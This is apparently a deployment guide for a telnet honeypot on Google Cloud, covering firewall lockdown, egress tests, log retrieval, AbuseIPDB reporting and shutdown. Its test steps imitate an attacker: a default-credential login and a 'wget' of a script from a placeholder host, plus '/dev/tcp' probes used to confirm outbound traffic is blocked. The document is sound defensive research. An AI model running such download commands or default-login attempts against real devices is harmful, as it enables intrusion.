# Deploying to Google Cloud

**Kill switch.** This closes the port right away. Afterwards, set `expose_fake_login = false`
in `terraform.tfvars`, or the next `terraform apply` opens it again.

```sh
gcloud compute firewall-rules delete honeypot-fake-login --quiet
```

**Daily logs.** From the top of the repo, this copies the logs to your computer and prints a
short summary, including the AbuseIPDB review list (see "Reporting to AbuseIPDB" below).

```sh
deploy/daily-logs.sh
```

These are the commands for the Stage 6 checklist in the [main README](../README.md), in
order. The fake login stays closed to the internet until step 8, so you can stop at any
point before that and nothing is exposed.

| File                     | What it is                                           |
| ------------------------ | ---------------------------------------------------- |
| `gcp/main.tf`            | The network, firewall rules and server, as Terraform |
| `host/nftables.conf`     | The firewall on the server itself                    |
| `host/honeypot.service`  | How systemd runs the program, with its limits        |
| `host/credentials.txt`   | The logins the fake shell accepts (Stage 7)          |
| `host/honeypot-shell.conf` | What turns the fake shell on (Stage 7)             |

Commands run on your own computer, unless they're under "On the server".

## 1. Create the account and project

Create a Google account just for this and turn on 2-Step Verification. Then sign in at
[console.cloud.google.com](https://console.cloud.google.com) and set up billing, which asks
for a payment method even though most of this is free.

```sh
gcloud auth login
gcloud auth application-default login

PROJECT_ID=rust-honeypot-$(openssl rand -hex 3)
gcloud projects create "$PROJECT_ID"
gcloud config set project "$PROJECT_ID"
gcloud config set compute/zone us-central1-a

gcloud billing accounts list
BILLING_ACCOUNT=paste-the-account-id-here
gcloud billing projects link "$PROJECT_ID" --billing-account="$BILLING_ACCOUNT"
gcloud services enable compute.googleapis.com iap.googleapis.com \
  logging.googleapis.com billingbudgets.googleapis.com

gcloud billing budgets create --billing-account="$BILLING_ACCOUNT" \
  --display-name=honeypot --budget-amount=10 \
  --filter-projects="projects/$PROJECT_ID" \
  --threshold-rule=percent=0.5 --threshold-rule=percent=1.0 \
  --billing-project="$PROJECT_ID"
```

New projects come with a `default` network that has permissive rules. Nothing here uses it,
so delete it:

```sh
gcloud compute firewall-rules delete default-allow-icmp default-allow-internal \
  default-allow-rdp default-allow-ssh --quiet
gcloud compute networks delete default --quiet
```

## 2. Make the admin SSH key

Use a passphrase, and don't use this key for anything else.

```sh
ssh-keygen -t ed25519 -f ~/.ssh/honeypot_admin -C honeypot-admin
```

## 3. Create the server and firewall rules

From `deploy/gcp`:

```sh
cp terraform.tfvars.example terraform.tfvars   # then set project_id in it
terraform init
terraform plan                                 # read what it's going to create
terraform apply
terraform output -raw ssh_config >> ~/.ssh/config
```

The server can connect out for now, so it can install packages, and the only way in is the
IAP tunnel. Check both of these. The first should print nothing, because the server has no
service account.

```sh
gcloud compute instances describe honeypot --format='value(serviceAccounts)'
ssh honeypot true
```

## 4. Set up the server

From the top of the repo:

```sh
scp target/x86_64-unknown-linux-musl/release/honeypot \
  deploy/host/honeypot.service deploy/host/nftables.conf honeypot:
ssh honeypot
```

On the server. These background services would keep trying to connect out, so they're turned
off. If one of them doesn't exist on this image, that's fine.

```sh
sudo apt-get update && sudo apt-get -y full-upgrade && sudo apt-get -y install nftables
for unit in exim4 google-osconfig-agent unattended-upgrades apt-daily.timer apt-daily-upgrade.timer; do
  sudo systemctl disable --now "$unit"
done

sudo mkdir -p /etc/systemd/resolved.conf.d
printf '[Resolve]\nLLMNR=no\nMulticastDNS=no\n' | sudo tee /etc/systemd/resolved.conf.d/quiet.conf

sudo useradd --system --no-create-home --shell /usr/sbin/nologin honeypot
sudo install -D -m 755 honeypot /opt/honeypot/honeypot
sudo install -m 644 honeypot.service /etc/systemd/system/honeypot.service
sudo install -m 644 nftables.conf /etc/nftables.conf
sudo systemctl daemon-reload

sudo nft -c -f /etc/nftables.conf
sudo systemctl enable nftables
sudo reboot
```

If `ssh honeypot` works after the reboot, the firewall allows admin access. If it doesn't,
nothing is lost yet: rebuild the server with
`terraform apply -replace=google_compute_instance.honeypot` and start this step again.

On the server, test `nftables` while the cloud firewall still allows outbound traffic. Then
check that password logins are off. It should say `blocked` and `passwordauthentication no`.

```sh
timeout 5 bash -c '</dev/tcp/1.1.1.1/443' && echo 'CONNECTED: STOP' || echo blocked
sudo sshd -T | grep -i '^passwordauthentication'
```

## 5. Close outbound traffic in the cloud firewall

In `terraform.tfvars`, set `allow_setup_egress = false`, then run `terraform apply`.

On the server, test the cloud firewall alone, by turning `nftables` off for a moment. Nobody
else can reach the server yet, so this is safe. Then check that the clock still syncs, which
uses one of the exceptions in `nftables.conf`.

```sh
sudo nft flush ruleset
timeout 5 bash -c '</dev/tcp/1.1.1.1/443' && echo 'CONNECTED: STOP' || echo blocked
sudo systemctl restart nftables
timedatectl show -p NTPSynchronized
```

## 6. Start the program

On the server. Only do this once you're happy with the checklist so far, since this is the
one place `--checklist-done` is used. The cloud firewall still keeps visitors out.

```sh
sudo systemctl enable --now honeypot
systemctl status honeypot --no-pager
df -h /
timeout 5 bash -c 'exec 3<>/dev/tcp/127.0.0.1/2323; printf "test\nnot-a-real-password\n" >&3; cat <&3'
sudo sh -c 'tail -n 1 /var/lib/honeypot/logs/visits-*.jsonl'
```

Now see what the server's own services have tried to send. Any line here happened before a
single visitor arrived, so work out what each one is, and turn that service off if you can.
This list is what normal looks like, which you'll compare against later. Google's guest agent
also keeps trying to look up `logging.googleapis.com` and its other services. That's expected,
and those lookups are dropped without a log line, so they don't appear here.

```sh
sudo journalctl -k --grep egress-blocked --no-pager
```

## 7. Practise stopping it

```sh
gcloud compute instances stop honeypot
gcloud compute instances start honeypot
ssh honeypot systemctl is-active nftables honeypot
```

The public IP can change each time the server stops, which doesn't matter yet. `terraform apply`
updates it in the output. The server may also need a moment to accept `ssh` after starting.

## 8. Open the fake login

This is the step that faces the internet. Only do it once **every other item in the
checklist is ticked**, including the permission items.

In `terraform.tfvars`, set `expose_fake_login = true`, then run `terraform apply`. Then test
it from your own computer, typing a made-up username and password. Some home internet providers
block port 23, so if the first command fails, try it from another network.

```sh
IP=$(terraform output -raw public_ip)
nc -w 10 "$IP" 23
nc -z -w 5 "$IP" 22 && echo 'OPEN: STOP' || echo closed
nc -z -w 5 "$IP" 2323 && echo 'OPEN: STOP' || echo closed
```

## 9. Check it after a day

Any `egress-blocked-honeypot` line, or any hit in the cloud firewall's log, means stop the
server first and investigate afterwards. So does an `egress-blocked` line that isn't on your
list from step 6. The exception is your own test from step 5, which shows up in the cloud
firewall's log as a connection to 1.1.1.1 on port 443. The first command asks for kernel messages
by `_TRANSPORT=kernel` instead of `-k`, because `-k` only looks at the current boot, so a reboot
would hide anything from before it.

```sh
ssh honeypot "sudo journalctl _TRANSPORT=kernel --since '1 day ago' --grep egress-blocked --no-pager"
gcloud logging read "logName=\"projects/$(gcloud config get project)/logs/compute.googleapis.com%2Ffirewall\"" \
  --freshness=1d --limit=20
```

Once the fake shell from Stage 7 is on, more things mean stop. They're listed in the Stage 7
checklist in the [main README](../README.md), and `deploy/daily-logs.sh` says which one it found.

## Turning on the fake shell

This is for Stage 7. Only do it once everything under "Before it goes on the server" in the
[main README](../README.md) is ticked. Until then, the server keeps running the fake login on its
own, and nothing else changes.

Start with "Updating the server" below, which closes the port, copies the logs off and reinstalls
the server. Build the program the same way as in Stage 6. At step 4, upload two more files:

```sh
scp target/x86_64-unknown-linux-musl/release/honeypot \
  deploy/host/honeypot.service deploy/host/nftables.conf \
  deploy/host/credentials.txt deploy/host/honeypot-shell.conf honeypot:
```

On the server, run these after the `systemctl daemon-reload` in step 4, and before the reboot:

```sh
sudo install -m 644 credentials.txt /opt/honeypot/credentials.txt
sudo install -D -m 644 honeypot-shell.conf /etc/systemd/system/honeypot.service.d/shell.conf
sudo systemctl daemon-reload
```

Carry on through steps 5 and 6. Then, on the server, check the shell before anyone can reach it.
The first command should show `noexec`, which means nothing outside the program's folder can be
run. The second should start with a few odd characters, which are the telnet opening, and end with
a fake `wget` failure, and the third should show that command and
its address. The last should find no entries, because nothing tried to connect out. `203.0.113.1`
is reserved for documentation, so nobody's there.

```sh
sudo awk '$5 == "/" { print $6 }' "/proc/$(systemctl show honeypot -p MainPID --value)/mountinfo"
timeout 5 bash -c 'exec 3<>/dev/tcp/127.0.0.1/2323; printf "root\nroot\nwget http://203.0.113.1/a.sh\nexit\n" >&3; cat <&3'
sudo sh -c 'tail -n 1 /var/lib/honeypot/logs/visits-*.jsonl'
sudo journalctl -k --since '5 minutes ago' --grep egress-blocked-honeypot --no-pager
```

Practise turning the shell off without stopping anything else. That also removes the telnet
opening, so the server behaves exactly as it did before. The last command should say
`Login incorrect`, with no odd characters first.

```sh
sudo rm /etc/systemd/system/honeypot.service.d/shell.conf
sudo systemctl daemon-reload && sudo systemctl restart honeypot
timeout 5 bash -c 'exec 3<>/dev/tcp/127.0.0.1/2323; printf "root\nroot\n" >&3; cat <&3'
```

Turn it on again the same way as before, and restart:

```sh
sudo install -D -m 644 honeypot-shell.conf /etc/systemd/system/honeypot.service.d/shell.conf
sudo systemctl daemon-reload && sudo systemctl restart honeypot
```

Then do step 7 and step 8. After step 8, test it from your own computer. The first command should
reach the prompt and end with the fake `wget` failure, and the second should say `Login incorrect`.
The last one tests outbound from the server, and should say `blocked`. Leave `nftables` running for
this, and don't repeat the `nft flush` from step 5, because the port is open now.

```sh
IP=$(terraform output -raw public_ip)
printf 'root\nroot\nuname -m\nwget http://203.0.113.1/a.sh\nexit\n' | nc -w 10 "$IP" 23
printf 'root\nnot-on-the-list\n' | nc -w 10 "$IP" 23
nc -z -w 5 "$IP" 22 && echo 'OPEN: STOP' || echo closed
nc -z -w 5 "$IP" 2323 && echo 'OPEN: STOP' || echo closed
ssh honeypot "timeout 5 bash -c '</dev/tcp/1.1.1.1/443' && echo 'CONNECTED: STOP' || echo blocked"
```

The next day, `deploy/daily-logs.sh` should say `Fake shell: on` and `Nothing that needs stopping.`

## Copying logs off

The server never sends anything out, so you pull the logs from your own computer. Keep this
folder out of git and cloud sync. The last line deletes copies on the same schedule as
`KEEP_DAYS`, so change the number if you change `KEEP_DAYS`.

```sh
(umask 077; mkdir -p ~/honeypot-logs)
ssh honeypot 'sudo tar -C /var/lib/honeypot/logs -cf - .' | tar -C ~/honeypot-logs --no-same-owner -xf -
find ~/honeypot-logs -name 'visits-*.jsonl' -mtime +30 -delete
```

`deploy/daily-logs.sh` does the same, but copies only the logs that have changed, then prints a
short summary and tells you if anything means you should stop the server. It's meant to be run
once a day.

## Reporting to AbuseIPDB

`deploy/daily-logs.sh` also prints a review list: every IP that got into the fake shell in the
last 24 hours, masked to two numbers, with its sessions, what it did and the categories it would
be reported under. It never reports anything itself. Left out: your own test IPs, anything that
isn't a public IP, and any IP reported in the last 7 days. Research scanners are marked `skip`:
Censys by its published ranges, and Shodan and similar by a reverse DNS name that resolves back to
the same IP, so a fake PTR record can't get an attacker skipped.

To report them, run this in your own terminal, from the top of the repo:

```sh
python3 analysis/report_abuseipdb.py          # shows what it would report, sends nothing
python3 analysis/report_abuseipdb.py --send   # asks you to confirm, then for your API key
```

With `--send` it shows the list again, asks for any numbers to leave out, and asks you to type
`yes`. Only then does it ask for your AbuseIPDB API key, without showing it, and the key is never
saved. Each report sends the IP, categories 18 Brute-Force and 23 IoT Targeted, the time the IP
was first seen in the list's window, and one of three fixed comments, so it never holds a password, a command,
an address or any IP. Each comment starts "Telnet honeypot posing as an IoT device: logged in with
a factory-default username and password, then", and ends as below.

| What the IP did  | Comment ends                                            |
| ---------------- | ------------------------------------------------------- |
| Logged in only   | "sent no commands."                                     |
| Sent commands    | "sent shell commands."                                  |
| Tried a download | "tried to download and run a file from another server." |

Each report is recorded as soon as it goes through, in `~/honeypot-logs/abuseipdb/reported.json`,
so running the script again never reports the same IP twice in 7 days. It pauses between reports,
skips an IP AbuseIPDB says you reported in the last 15 minutes, and stops when the key is refused
or the daily limit is reached (1,000 reports on a free account). Running it again skips everything
already recorded.

| Option               | What it does                       |
| -------------------- | ---------------------------------- |
| `--include-scanners` | Reports the research scanners too  |
| `--limit N`          | Sends at most N reports in one run |

Both files in `~/honeypot-logs/abuseipdb/` hold full IPs, so they follow safety rule 4 like the
logs: readable only by you, out of git and cloud sync, and entries older than 30 days are dropped
each day. To rebuild the list without the rest of the daily check, run
`python3 analysis/abuse_review.py`. Add `--no-dns` to skip the reverse lookups, which send each IP
to your DNS resolver and can show the IP's owner that someone looked it up.

If you missed a few days, the daily list only covers the last 24 hours. Build one that goes back
to your last run instead, and report from it before the next daily run replaces it:

```sh
python3 analysis/abuse_review.py --since 2026-11-08T03:28Z   # UTC unless the time names a zone
python3 analysis/report_abuseipdb.py --send
```

The 7-day rule still applies, so nothing reported in the last week comes back, however far back
the list goes. `--since` can't go back more than 30 days, because older logs are deleted.

The tests for both scripts need no network and no key:

```sh
python3 -m unittest discover -s analysis -p 'test_*.py'
```

## Updating the server

Reinstall it from a fresh image, which also deletes the logs on it, so copy them off first. Follow
this order, so that nothing gets lost.

Close the port first, because today's log keeps growing while it's open. In `terraform.tfvars`, set
`expose_fake_login = false`, then run `terraform apply`. Wait a minute for the last visits to end,
since a visit lasts at most 30 seconds.

Copy everything off, as in "Copying logs off" below, and check every copy against the server. Each
file should say `OK`. Don't go on until they all do, because the reinstall deletes the originals.

```sh
(umask 077; mkdir -p ~/honeypot-logs)
ssh honeypot 'sudo tar -C /var/lib/honeypot/logs -cf - .' | tar -C ~/honeypot-logs --no-same-owner -xf -
ssh honeypot "sudo sh -c 'cd /var/lib/honeypot/logs && sha256sum visits-*.jsonl'" | (cd ~/honeypot-logs && sha256sum -c -)
```

Now rename your copy of today's log. The new server starts its own log with today's date, the same
filename, and the next copy would replace yours with it. The new name still starts with `visits-`,
so it's deleted on the same schedule. The daily summary only reads logs named exactly by date, so
it leaves these visits out.

```sh
TODAY=$(date -u +%F)
[ ! -e ~/honeypot-logs/visits-$TODAY.jsonl ] ||
  mv -n ~/honeypot-logs/visits-$TODAY.jsonl ~/honeypot-logs/visits-$TODAY-old-server-$(date -u +%H%M%S).jsonl
ls ~/honeypot-logs
```

Then, in `terraform.tfvars`, set `allow_setup_egress = true`, and reinstall:

```sh
terraform apply -replace=google_compute_instance.honeypot
ssh-keygen -R honeypot
```

Then go back to step 4, and carry on through to step 8.

## Stopping it

| What you want                      | Command                                                 |
| ---------------------------------- | ------------------------------------------------------- |
| Stop now and keep the evidence     | `gcloud compute instances stop honeypot`                |
| Keep it running but close the port | Set `expose_fake_login = false`, then `terraform apply` |
| Close the fake shell, keep the login | On the server: `sudo rm /etc/systemd/system/honeypot.service.d/shell.conf`, `sudo systemctl daemon-reload`, then `sudo systemctl restart honeypot` |
| Remove the server and its logs     | `terraform destroy`                                     |
| End everything for good            | `gcloud projects delete "$(gcloud config get project)"` |

Stopping works from a phone too: open the Cloud Console, go to Compute Engine, then VM
instances.
